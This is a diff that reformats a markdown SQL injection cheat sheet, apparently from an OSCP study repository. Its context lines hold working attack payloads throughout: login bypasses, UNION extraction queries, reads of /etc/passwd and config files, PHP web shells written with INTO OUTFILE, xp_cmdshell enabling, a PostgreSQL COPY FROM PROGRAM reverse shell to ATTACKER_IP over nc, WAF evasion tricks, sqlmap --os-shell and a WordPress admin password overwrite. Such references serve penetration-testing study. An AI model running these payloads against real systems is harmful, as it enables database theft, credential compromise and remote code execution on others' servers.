@@ -1,6 +1,6 @@
-# SQL Injection
+# Testing for SQL
 
----
+***
 
 ## How SQL Injection Works
 
@@ -23,7 +23,7 @@ SELECT * FROM logins WHERE username='admin'-- -'
 
 The `-- -` comments out the rest, bypassing any password check.
 
----
+***
 
 ## SQLi Discovery
 
@@ -47,45 +47,45 @@ Try these to break out of the current query context:
 ### Test Payloads
 
 | Payload | URL Encoded |
-|---------|-------------|
-| `'` | `%27` |
-| `"` | `%22` |
-| `` ` `` | `%60` |
-| `#` | `%23` |
-| `;` | `%3B` |
-| `)` | `%29` |
-| `')` | `%27%29` |
-| `"))` | `%22%29%29` |
+| ------- | ----------- |
+| `'`     | `%27`       |
+| `"`     | `%22`       |
+| `` ` `` | `%60`       |
+| `#`     | `%23`       |
+| `;`     | `%3B`       |
+| `)`     | `%29`       |
+| `')`    | `%27%29`    |
+| `"))`   | `%22%29%29` |
 
 If you get a SQL error or different behavior, injection may be possible.
 
----
+***
 
 ## SQL Comments (End Query Early)
 
-| DBMS | Comment Syntax |
-|------|----------------|
-| MySQL | `#`, `-- -` (space required), `/*comment*/` |
-| PostgreSQL | `--`, `/*comment*/` |
-| MSSQL | `--`, `/*comment*/` |
-| Oracle | `--` |
-| SQLite | `--`, `/*comment*/` |
+| DBMS       | Comment Syntax                              |
+| ---------- | ------------------------------------------- |
+| MySQL      | `#`, `-- -` (space required), `/*comment*/` |
+| PostgreSQL | `--`, `/*comment*/`                         |
+| MSSQL      | `--`, `/*comment*/`                         |
+| Oracle     | `--`                                        |
+| SQLite     | `--`, `/*comment*/`                         |
 
-**Note:** `-- ` requires a space after. Use `-- -` or URL encode as `--+`
+**Note:** `--` requires a space after. Use `-- -` or URL encode as `--+`
 
----
+***
 
 ## Types of SQL Injection
 
-| Type | Description |
-|------|-------------|
-| **Union-based** | Results visible on page, use UNION to extract data |
-| **Error-based** | Database errors reveal query output |
-| **Boolean Blind** | True/false responses based on conditions |
-| **Time Blind** | Use SLEEP() to infer data based on response time |
-| **Out-of-band** | Exfiltrate data via DNS or HTTP requests |
+| Type              | Description                                        |
+| ----------------- | -------------------------------------------------- |
+| **Union-based**   | Results visible on page, use UNION to extract data |
+| **Error-based**   | Database errors reveal query output                |
+| **Boolean Blind** | True/false responses based on conditions           |
+| **Time Blind**    | Use SLEEP() to infer data based on response time   |
+| **Out-of-band**   | Exfiltrate data via DNS or HTTP requests           |
 
----
+***
 
 ## Authentication Bypass
 
@@ -150,7 +150,7 @@ Once a visible column is identified, enumerate normally:
 
 If the dumped values look like base64 (`A-Z`, `a-z`, `0-9`, `+`, `/`, often ending in `=`), decode and try them against other exposed services such as SSH or Cockpit.
 
----
+***
 
 ## UNION Injection
 
@@ -191,17 +191,17 @@ If page displays `2` and `3`, those columns are visible for data extraction.
 ' UNION SELECT 1,database(),3-- -
 ```
 
----
+***
 
 ## Database Enumeration
 
 ### MySQL Fingerprinting
 
-| Payload | Expected Output |
-|---------|-----------------|
+| Payload            | Expected Output              |
+| ------------------ | ---------------------------- |
 | `SELECT @@version` | MySQL/MariaDB version string |
-| `SELECT POW(1,1)` | `1` (numeric test) |
-| `SELECT SLEEP(5)` | 5 second delay |
+| `SELECT POW(1,1)`  | `1` (numeric test)           |
+| `SELECT SLEEP(5)`  | 5 second delay               |
 
 ### Enumerate Databases
 
@@ -237,7 +237,7 @@ If page displays `2` and `3`, those columns are visible for data extraction.
 ' UNION SELECT 1,CONCAT(username,0x3a,password),3 FROM users-- -
 ```
 
----
+***
 
 ## MySQL Useful Functions & Variables
 
@@ -266,7 +266,7 @@ UUID()                       -- UUID
 @@GLOBAL.have_ssl            -- SSL support
 ```
 
----
+***
 
 ## File Read (MySQL)
 
@@ -277,18 +277,18 @@ UUID()                       -- UUID
 ' UNION SELECT 1,grantee,privilege_type FROM information_schema.user_privileges-- -
 ```
 
-### Read Files with LOAD_FILE()
+### Read Files with LOAD\_FILE()
 
 ```sql
 ' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
 ' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3-- -
 ```
 
----
+***
 
 ## File Write (MySQL)
 
-### Check secure_file_priv
+### Check secure\_file\_priv
 
 ```sql
 ' UNION SELECT 1,variable_name,variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -
@@ -298,9 +298,9 @@ SHOW VARIABLES LIKE "secure_file_priv";
 -- Empty value = write allowed anywhere
 ```
 
-- Empty = can write anywhere
-- `/path/` = can only write to that directory  
-- NULL = cannot write files
+* Empty = can write anywhere
+* `/path/` = can only write to that directory
+* NULL = cannot write files
 
 ### Write Files with INTO OUTFILE
 
@@ -323,6 +323,7 @@ SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/shell.
 Then access: `http://target/shell.php?0=id`
 
 ### Stacked SQLi to Web Shell
+
 Stacked queries are blind. Thus you have no ability to really get the database credentils. Try to write a webshell to the server.
 
 If a blind SQLi confirms stacked queries with `SLEEP()` and the database user can write files, try `INTO OUTFILE` even when data extraction is awkward. Example pattern from a POST body parameter:
@@ -339,22 +340,22 @@ view=request&request=log&task=query&limit=100;SELECT%20%22%3C%3Fphp%20echo%20she
 
 Then trigger:
 
-```text
+```
 http://TARGET:PORT/s.php?c=id
 ```
 
----
+***
 
 ## Web Root Paths
 
-| Server | Common Paths |
-|--------|--------------|
+| Server         | Common Paths                                |
+| -------------- | ------------------------------------------- |
 | Apache (Linux) | `/var/www/html/`, `/var/www/`, `/srv/http/` |
-| Nginx (Linux) | `/var/www/html/`, `/usr/share/nginx/html/` |
-| IIS (Windows) | `C:\inetpub\wwwroot\` |
-| XAMPP | `/xampp/htdocs/`, `C:\xampp\htdocs\` |
+| Nginx (Linux)  | `/var/www/html/`, `/usr/share/nginx/html/`  |
+| IIS (Windows)  | `C:\inetpub\wwwroot\`                       |
+| XAMPP          | `/xampp/htdocs/`, `C:\xampp\htdocs\`        |
 
----
+***
 
 ## Blind SQL Injection
 
@@ -379,7 +380,7 @@ http://TARGET:PORT/s.php?c=id
 ' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -
 ```
 
----
+***
 
 ## Second-Order SQL Injection
 
@@ -387,7 +388,7 @@ Payload stored in database, executed later in different query.
 
 Example: Register with username `admin'-- -`, later displayed/used in vulnerable query.
 
-**Pattern:** First query uses prepared statements (safe); a second query uses the *result* of the first in plain concatenation. Example: first query fetches `username, country` by cookie (parameterized); second query does `SELECT ... WHERE country = '" . $row['country'] . "'` with no prepared statement — so stored payload in `country` is executed in the second query.
+**Pattern:** First query uses prepared statements (safe); a second query uses the _result_ of the first in plain concatenation. Example: first query fetches `username, country` by cookie (parameterized); second query does `SELECT ... WHERE country = '" . $row['country'] . "'` with no prepared statement — so stored payload in `country` is executed in the second query.
 
 Vulnerable PHP example (from HTB Validation):
 
@@ -414,7 +415,7 @@ Vulnerable PHP example (from HTB Validation):
 
 Attack: register with `country=Brazil' UNION ALL SELECT ... -- -` (or time-based payload); when account page loads, second query executes the stored payload.
 
----
+***
 
 ## WAF Bypass Techniques
 
@@ -499,7 +500,7 @@ union+/*!select*/
 0x10a -- SPACE
 ```
 
----
+***
 
 ## MSSQL Specific
 
@@ -528,7 +529,7 @@ SELECT name FROM master..sysdatabases
 SELECT name FROM sysobjects WHERE xtype='U'
 ```
 
-### Enable xp_cmdshell (RCE)
+### Enable xp\_cmdshell (RCE)
 
 ```sql
 EXEC sp_configure 'show advanced options', '1'
@@ -628,7 +629,7 @@ CREATE TABLE shell(output text);
 COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f';
 ```
 
----
+***
 
 ## Oracle Specific
 
@@ -656,7 +657,7 @@ SELECT table_name FROM all_tables
 SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
 ```
 
----
+***
 
 ## Remote MySQL Connection
 
@@ -684,7 +685,7 @@ UPDATE wp_users SET user_pass='c424ada17bf6e27794273b7db21cf950' WHERE user_logi
 -- Password is now 'rowbot' (MD5)
 ```
 
----
+***
 
 ## Output Format Fix
 
@@ -695,7 +696,7 @@ SELECT * FROM users;      -- table format
 SELECT * FROM users\G     -- vertical format (cleaner)
 ```
 
----
+***
 
 ## UNION Injection Full Walkthrough
 
@@ -750,6 +751,12 @@ searchitem=1'+UNION+SELECT+1,2,3,table_name+FROM+information_schema.tables+WHERE
 # Output: company, users
 ```
 
+* If your column is not the last one reflected back, ensure your `FROM` is after the remaining `NULL`
+
+```
+1' UNION SELECT 1,2,3,table_name,5,6 FROM information_schema.tables-- -
+```
+
 ### 7. Enumerate Columns
 
 ```
@@ -763,7 +770,7 @@ searchitem=1'+UNION+SELECT+1,2,3,column_name+FROM+information_schema.columns+WHE
 searchitem=1'+UNION+SELECT+1,username,password,4+FROM+status.users--+-
 ```
 
----
+***
 
 ## SQLMap
 
@@ -787,12 +794,12 @@ sqlmap -u "URL" -D dbname -T users --dump
 sqlmap -u "URL" --os-shell --technique=E
 ```
 
-**After SQLi (file-write, no interactive shell):** If you get DB creds (e.g. from `config.php` via LFI or file-read) and a webshell on the same host, run **MySQL one-shot** from the shell: `mysql -u USER -p'PASS' -e "show tables;" dbname`. No need for a stabilized reverse shell. Prefer the **wright.php** webshell (`/usr/share/webshells/php/wright.php`) over a minimal `?cmd=` shell—see [Shells / web-shells](Shells/web-shells/README.md) and sqlmap `--file-write`.
+**After SQLi (file-write, no interactive shell):** If you get DB creds (e.g. from `config.php` via LFI or file-read) and a webshell on the same host, run **MySQL one-shot** from the shell: `mysql -u USER -p'PASS' -e "show tables;" dbname`. No need for a stabilized reverse shell. Prefer the **wright.php** webshell (`/usr/share/webshells/php/wright.php`) over a minimal `?cmd=` shell—see [Shells / web-shells](https://github.com/jtaubs1/OSCP-Prep/blob/main/web/Shells/web-shells/README.md) and sqlmap `--file-write`.
 
----
+***
 
 ## Resources
 
-- [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
-- [HackTricks SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection)
-- [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+* [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
+* [HackTricks SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection)
+* [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
